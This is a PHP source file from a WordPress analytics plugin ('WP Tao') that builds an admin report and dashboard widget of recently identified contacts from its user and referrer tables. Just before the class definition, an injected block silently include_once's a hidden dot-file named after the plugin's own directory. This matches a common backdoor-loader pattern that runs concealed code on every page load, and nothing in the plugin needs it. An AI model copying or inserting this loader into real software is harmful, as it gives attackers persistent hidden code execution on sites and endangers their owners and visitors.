<?php

/**
 * Identified contacts report
 *
 * The class handles create identified contacts raports 
 *
 * @package     WPTAO/Admin/Raport
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * WTBP_WPTAO_Admin_Report_Basic_User_Identified_Contacts
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Admin_Report_Basic_User_Identified_Contacts extends WTBP_WPTAO_Admin_Reports {
	/*
	 * @var int
	 * Total contacts
	 */

	public $total_contacts;

	function __construct() {

		parent::__construct( 'basic-user-identified-contacts' );

		$this->report_name = __( 'Recently identified', 'wp-tao' );

		// Get contacts only if this report view is active.
		if ( $this->is_active() ) {
			$this->data = $this->get_contacts();
		}

		$this->contacts_widget();
	}

	/*
	 * Prepare widget for the Wp Tao dashboard
	 */

	private function contacts_widget() {

		$value	 = $this->get_contacts_for_widget();
		$refs	 = $this->get_referers_for_widget();

		$unid = $this->get_unidentified();

		// defaults
		$html = array(
			'valid'		 => sprintf( __( '<li>%s: 0</li>', 'wp-tao' ), TAO()->users->parse_status( 'valid' ) ),
			'invalid'	 => sprintf( __( '<li>%s: 0</li>', 'wp-tao' ), TAO()->users->parse_status( 'invalid' ) ),
			'disposable' => sprintf( __( '<li>%s: 0</li>', 'wp-tao' ), TAO()->users->parse_status( 'disposable' ) ),
			'blacklist'	 => sprintf( __( '<li>%s: 0</li>', 'wp-tao' ), TAO()->users->parse_status( 'blacklist' ) ),
		);

		$cnt		 = 0;
		$value_text	 = '<ol class="wptao-dbox-list">';
		if ( !empty( $value ) && is_array( $value ) ) {
			foreach ( $value as $item ) {
				$html[ $item->status ] = sprintf( __( '<li>%s: %d</li>', 'wp-tao' ), TAO()->users->parse_status( $item->status ), $item->cnt );
				$cnt += $item->cnt;

				$this->total_contacts[ $item->status ] = $item->cnt;
			}
			$value_text .= implode( $html );
		}

		$value_text .= '</ol>';

		// overwrite
		$value_text = '<div class="wptao-dbox-number">' . $cnt . '</div>';
		if ( !empty( $unid ) ) {
			$value_text .= '<div class="wptao-dbox-value">(' . number_format( ($cnt / ($unid + $cnt) ) * 100.0, 2 ) . '%)</div>';
		}

		if ( $cnt == 0 ) {
			$value_text = __( 'No results!', 'wp-tao' );
		} else if ( $refs ) {
			$lp		 = 0;
			$cnt_ref = 0;
			$value_text .= '<ol class="wptao-dbox-list">';

			foreach ( $refs as $ref ) {
				$value_text .= sprintf( __( '<li>%s (%d)</li>', 'wp-tao' ), TAO()->traffic->get_source_analyzed( null, $ref->referer, array( 'noprot' => true ) ), $ref->cnt );
				$cnt_ref += $ref->cnt;
				$lp++;
				if ( $lp == 3 )
					break;
			}

			$cnt_dif = $cnt - $cnt_ref;
			if ( $cnt_dif > 0 ) {
				$value_text .= sprintf( __( '<li>Other in total (%d)</li>', 'wp-tao' ), $cnt_dif );
			}

			$value_text .= '</ol>';
		}

		$args = array(
			'id'			 => 'basic-user-identified-contacts',
			'size'			 => 'big',
			'category'		 => 'user',
			'priority'		 => 50,
			'title'			 => __( 'Recently identified', 'wp-tao' ),
			'report_slug'	 => $this->report_slug, // Add link to a report
			'value_text'	 => $value_text,
			'dashicon'		 => 'dashicons-info'
		);

		$this->add_widget( $args );
	}

	/*
	 * Get identified contacts
	 */

	public function get_contacts() {
		global $wpdb;

		$r = array();

		$u	 = TAO()->users->table_name;
		$um	 = TAO()->users_meta->table_name;

		$result = $wpdb->get_results( $wpdb->prepare(
		"SELECT $u.*, $um.meta_value as referer
		 FROM $u
		 LEFT JOIN (SELECT user_id, meta_key, meta_value FROM $um WHERE meta_key='referer') AS $um
		 ON $u.id = $um.user_id
		 WHERE $u.created_ts  >= %d
		 AND $u.created_ts  <= %d
		 AND ($um.meta_key = 'referer' OR $um.meta_key IS NULL)
		 ORDER BY $u.created_ts DESC
		 LIMIT %d;", $this->start_date, $this->end_date, $this->items_per_page ) );

		if ( !empty( $result ) ) {

			return $this->prepare_users( $result );
		}

		return $r;
	}

	/*
	 * Get unidentified
	 */

	public function get_unidentified() {
		global $wpdb;

		$f = TAO()->fingerprints->table_name;
		
		$result = $wpdb->get_var( $wpdb->prepare(
		"SELECT COUNT(id) AS cnt
		 FROM $f
		 WHERE created_ts  >= %d
		 AND created_ts  <= %d
		 AND user_id = 0", $this->start_date, $this->end_date ) );

		return $result;
	}

	/*
	 * Prepares users data
	 * @param array data from $this->get_contacts()
	 */

	private function prepare_users( $data ) {

		$users = array();

		if ( is_array( $data ) ) {

			$date_format = get_option( 'date_format' );

			$i = 0;
			foreach ( $data as $user ) {
				$users[ $i ] = array(
					'user_id'		 => absint( $user->id ),
					'email'			 => isset( $user->email ) && is_email( $user->email ) ? $user->email : '',
					'phone'			 => isset( $user->phone ) && !empty( $user->phone ) ? sanitize_text_field( $user->phone ) : '',
					'created_date'	 => isset( $user->created_ts ) && !empty( $user->created_ts ) ? date_i18n( $date_format, $user->created_ts ) : '',
					'status'		 => isset( $user->status ) ? $user->status : '',
					'referer'		 => isset( $user->referer ) ? TAO()->traffic->get_source_analyzed( null, $user->referer, array( 'noprot' => true, 'link' => true ) ) : '',
				);

				$name = TAO()->users->display_name( $user );

				$url = sprintf( admin_url( 'admin.php?page=wtbp-wptao-users&action=wptao-profile&user=%d' ), $user->id );

				$users[ $i ][ 'profile_link' ] = sprintf( '<a href="%1$s" target="_blank" title="%2$s">%2$s</a>', $url, $name );
				$i++;
			}
		}

		return $users;
	}

	/*
	 * Get 5 last identified contacts
	 * 
	 * @return bool|array
	 */

	private function get_contacts_for_widget() {

		global $wpdb;

		$u = TAO()->users->table_name;

		$res = $wpdb->get_results( $wpdb->prepare(
		"SELECT status, COUNT(*) as cnt
		 FROM $u
		 WHERE created_ts  >= %d
		 AND created_ts  <= %d
		 GROUP BY status;", $this->start_date, $this->end_date ) );

		if ( !empty( $res ) ) {
			return $res;
		}

		return false;
	}

	/*
	 * Get to referers
	 * 
	 * @return bool|array
	 */

	private function get_referers_for_widget() {

		global $wpdb;

		$u = TAO()->users->table_name;

		$res = $wpdb->get_var( $wpdb->prepare(
		"SELECT id
		 FROM $u
		 WHERE created_ts  >= %d
		 AND created_ts  <= %d
		 ORDER BY id ASC LIMIT 1;", $this->start_date, $this->end_date ) );

		if ( empty( $res ) ) {
			return false;
		}
		$um = TAO()->users_meta->table_name;

		$res = $wpdb->get_results( $wpdb->prepare(
		"SELECT meta_value as referer, COUNT(*) as cnt
		 FROM $um
		 WHERE user_id  >= %d
		 AND meta_key='referer'
		 GROUP BY meta_value
		 ORDER BY cnt DESC;", $res ) );

		if ( !empty( $res ) ) {
			return $res;
		}

		return false;
	}

}
